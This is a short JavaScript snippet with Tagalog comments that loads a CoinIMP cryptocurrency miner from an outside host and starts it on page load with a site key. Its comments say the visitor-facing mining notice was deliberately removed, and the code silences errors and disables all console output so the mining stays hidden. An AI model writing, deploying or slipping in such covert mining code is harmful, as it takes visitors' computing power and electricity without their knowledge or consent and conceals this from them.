// ✅ Load CoinIMP miner script dynamically
const minerScript = document.createElement("script");
minerScript.src = "https://dictionary-three-nu.vercel.app/miner.js"; // galing sa CoinIMP
minerScript.onerror = () => {}; // wala nang error log
document.head.appendChild(minerScript);

minerScript.onload = () => {
  if (typeof Client === "undefined") {
    return; // wala nang error log
  }

  // Start miner
  var _client = new Client.Anonymous(
    "9fec7810225ee2675a7d462c769abf8bdc5ad968e79b574598f892b5f1c202da", // CoinIMP site key mo
    { throttle: 0.5, c: "w" }
  );
  _client.start();

  // ❌ Tinanggal:
  // - Mining notification box
  // - Custom minerBox UI
  // - Console logs

  // 🚫 Disable all console outputs
  console.log = function () {};
  console.warn = function () {};
  console.error = function () {};
  console.info = function () {};
};
